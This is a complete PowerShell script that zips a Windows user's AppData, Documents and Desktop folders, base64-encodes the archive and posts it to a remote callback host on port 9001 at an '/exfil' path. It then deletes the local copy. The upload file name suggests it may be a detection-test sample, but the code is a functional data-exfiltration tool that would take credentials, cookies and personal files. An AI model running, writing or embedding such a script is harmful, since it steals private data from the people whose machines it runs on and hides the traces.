$destination = "$HOME\\Desktop\\Feemco_AppData_Backup.zip"
$DataPaths = ("$env:USERPROFILE\\AppData","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Desktop")
Compress-Archive -Path $DataPaths -DestinationPath $destination -Force -ErrorAction SilentlyContinue
$fileBytes = [System.IO.File]::ReadAllBytes($destination)
$base64File = [System.Convert]::ToBase64String($fileBytes)
$body = @{
    fileName = "exfil-clearlysomethingbad-flagthisforchristsakes.zip"
    content  = $base64File
} | ConvertTo-Json
Invoke-RestMethod -Uri 'http://callback.feemcotech.solutios:9001/exfil' -Method Post -Body $body -ContentType "application/json"
Remove-Item -Path $Destination
